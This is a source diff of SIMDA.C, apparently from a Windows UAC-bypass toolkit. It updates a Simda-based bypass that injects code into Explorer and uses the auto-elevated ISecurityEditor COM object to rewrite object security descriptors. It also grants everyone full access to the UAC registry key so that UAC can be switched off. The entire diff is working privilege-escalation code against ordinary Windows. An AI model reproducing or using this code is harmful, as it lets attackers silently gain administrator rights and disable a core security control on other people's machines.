@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015
+*  (C) COPYRIGHT AUTHORS, 2015 - 2016
 *
 *  TITLE:       SIMDA.C
 *
-*  VERSION:     1.91
+*  VERSION:     2.00
 *
-*  DATE:        12 Oct 2015
+*  DATE:        16 Nov 2015
 *
 *  Simda based UAC bypass using ISecurityEditor.
 *
@@ -22,14 +22,14 @@
 ELOAD_PARAMETERS_2 g_ElevParams2;
 
 /*
-* ucmElevatedDisableProc
+* ucmEvelatedAlterSecurityProc
 *
 * Purpose:
 *
-* Disable UAC using AutoElevated ISecurityEditor.
+* Change object security through ISecurityEditor(SetNamedInfo).
 *
 */
-DWORD WINAPI ucmElevatedDisableProc(
+DWORD WINAPI ucmEvelatedAlterSecurityProc(
 	PELOAD_PARAMETERS_2 elvpar
 	)
 {
@@ -76,9 +76,9 @@ DWORD WINAPI ucmElevatedDisableProc(
 		pps = NULL;
 		r = SecurityEditor1->lpVtbl->GetSecurity(
 			SecurityEditor1,
-			elvpar->szKey,
-			SE_REGISTRY_KEY,
-			DACL_SECURITY_INFORMATION,
+			elvpar->szTargetObject,
+			elvpar->ObjectType,
+			elvpar->SecurityInformation,
 			&pps
 			);
 
@@ -88,9 +88,9 @@ DWORD WINAPI ucmElevatedDisableProc(
 
 		r = SecurityEditor1->lpVtbl->SetSecurity(
 			SecurityEditor1,
-			elvpar->szKey,
-			SE_REGISTRY_KEY, /* this was later banned by ms in 10147 build by adding primitive crunch destroying original function logic */ 
-			DACL_SECURITY_INFORMATION,
+			elvpar->szTargetObject,
+			elvpar->ObjectType,
+			elvpar->SecurityInformation,
 			elvpar->szNewSDDL
 			);
 
@@ -111,15 +111,17 @@ DWORD WINAPI ucmElevatedDisableProc(
 }
 
 /*
-* ucmSimdaAlterKeySecurity
+* ucmSimdaAlterObjectSecurity
 *
 * Purpose:
 *
-* Set new entry in key DACL.
+* Set new entry in object DACL.
 *
 */
-BOOL ucmSimdaAlterKeySecurity(
-	LPWSTR lpTargetKey,
+BOOL ucmSimdaAlterObjectSecurity(
+	SE_OBJECT_TYPE ObjectType,
+	SECURITY_INFORMATION SecurityInformation,
+	LPWSTR lpTargetObject,
 	LPWSTR lpSddlString
 	)
 {
@@ -128,14 +130,14 @@ BOOL ucmSimdaAlterKeySecurity(
 
 	//just a basic check
 	if (
-		(lpTargetKey == NULL) ||
+		(lpTargetObject == NULL) ||
 		(lpSddlString == NULL)
 		)
 	{
 		return FALSE;
 	}
 
-	cch = _strlen_w(lpTargetKey);
+	cch = _strlen_w(lpTargetObject);
 	if ((cch == 0) || (cch > MAX_PATH)) {
 		return FALSE;
 	}
@@ -148,7 +150,7 @@ BOOL ucmSimdaAlterKeySecurity(
 	do {
 
 		_strcpy_w(g_ElevParams2.EleMoniker, L"Elevation:Administrator!new:{4D111E08-CBF7-4f12-A926-2C7920AF52FC}");
-		_strcpy_w(g_ElevParams2.szKey, lpTargetKey);
+		_strcpy_w(g_ElevParams2.szTargetObject, lpTargetObject);
 		_strcpy_w(g_ElevParams2.szNewSDDL, lpSddlString);
 
 		if (CLSIDFromString(L"{4D111E08-CBF7-4f12-A926-2C7920AF52FC}",
@@ -163,13 +165,15 @@ BOOL ucmSimdaAlterKeySecurity(
 			break;
 		}
 
-		g_ElevParams2.xCoInitialize = (pfnCoInitialize)GetProcAddress(g_ldp.hOle32, "CoInitialize");
-		g_ElevParams2.xCoCreateInstance = (pfnCoCreateInstance)GetProcAddress(g_ldp.hOle32, "CoCreateInstance");
-		g_ElevParams2.xCoGetObject = (pfnCoGetObject)GetProcAddress(g_ldp.hOle32, "CoGetObject");
-		g_ElevParams2.xCoUninitialize = (pfnCoUninitialize)GetProcAddress(g_ldp.hOle32, "CoUninitialize");
-		g_ElevParams2.xOutputDebugStringW = (pfnOutputDebugStringW)GetProcAddress(g_ldp.hKernel32, "OutputDebugStringW");
+		g_ElevParams2.ObjectType = ObjectType;
+		g_ElevParams2.SecurityInformation = SecurityInformation;
+		g_ElevParams2.xCoInitialize = (pfnCoInitialize)GetProcAddress(g_ctx.hOle32, "CoInitialize");
+		g_ElevParams2.xCoCreateInstance = (pfnCoCreateInstance)GetProcAddress(g_ctx.hOle32, "CoCreateInstance");
+		g_ElevParams2.xCoGetObject = (pfnCoGetObject)GetProcAddress(g_ctx.hOle32, "CoGetObject");
+		g_ElevParams2.xCoUninitialize = (pfnCoUninitialize)GetProcAddress(g_ctx.hOle32, "CoUninitialize");
+		g_ElevParams2.xOutputDebugStringW = (pfnOutputDebugStringW)GetProcAddress(g_ctx.hKernel32, "OutputDebugStringW");
 
-		bResult = ucmInjectExplorer(&g_ElevParams2, ucmElevatedDisableProc);
+		bResult = ucmInjectExplorer(&g_ElevParams2, ucmEvelatedAlterSecurityProc);
 
 	} while (cond);
 
@@ -196,7 +200,9 @@ BOOL ucmSimdaTurnOffUac(
 
 	do {
 
-		if (!ucmSimdaAlterKeySecurity(
+		if (!ucmSimdaAlterObjectSecurity(
+			SE_REGISTRY_KEY,
+			DACL_SECURITY_INFORMATION,
 			T_UACKEY,
 			T_SDDL_ALL_FOR_EVERYONE)
 			)
